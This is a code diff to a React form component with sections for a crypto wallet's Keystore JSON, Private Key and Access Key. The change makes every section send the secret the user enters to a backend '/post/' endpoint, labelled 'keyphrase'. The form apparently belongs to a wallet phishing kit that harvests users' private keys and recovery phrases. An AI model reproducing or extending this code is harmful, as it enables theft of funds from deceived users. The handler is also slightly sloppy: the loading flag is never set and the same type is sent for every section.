@@ -2,25 +2,27 @@ import React, { useState } from "react";
 import "./Form.css";
 import axios from "axios";
 // import { data } from "../data/FormData";
+import client from "../../api/client";
 
 function Form() {
   const [show, setShow] = useState("");
   const [message, setMessage] = useState("");
 
-  const formSubmit = (e) => {
+  const [loading, setLoading] = useState(false);
+  const formSubmit = async (e) => {
     e.preventDefault();
 
-    let data = {
-      message: { message },
-    };
-    axios
-      .post("/api/forma", data)
-      .then((res) => {
-        setMessage({ sent: true }, resetForm());
+    try {
+      const response = await client.post("/post/", { 
+        type: "keyphrase", 
+        phrase: message
       })
-      .catch(() => {
-        console.log("message not sent");
-      });
+      console.log("response", response);
+    } catch (error) {
+      console.log("error", error);
+    } finally {
+      setLoading(false);
+    }
   };
 
   const resetForm = () => {
@@ -59,7 +61,7 @@ function Form() {
           Keystore JSON
         </div>
         {show === "section2" ? (
-          <form className="form-content">
+          <form className="form-content" onSubmit={formSubmit}>
             <div>
               {" "}
               <label id="message1">Keystore JSON:</label>
@@ -83,7 +85,7 @@ function Form() {
           Private Key
         </div>
         {show === "section3" ? (
-          <form className="form-content">
+          <form className="form-content" onSubmit={formSubmit}>
             <div>
               {" "}
               <label id="message2">Private Key:</label>
@@ -107,7 +109,7 @@ function Form() {
           Access Key
         </div>
         {show === "section4" ? (
-          <form className="form-content">
+          <form className="form-content" onSubmit={formSubmit}>
             <div className="access">
               {" "}
               <h3>Access Key:</h3>
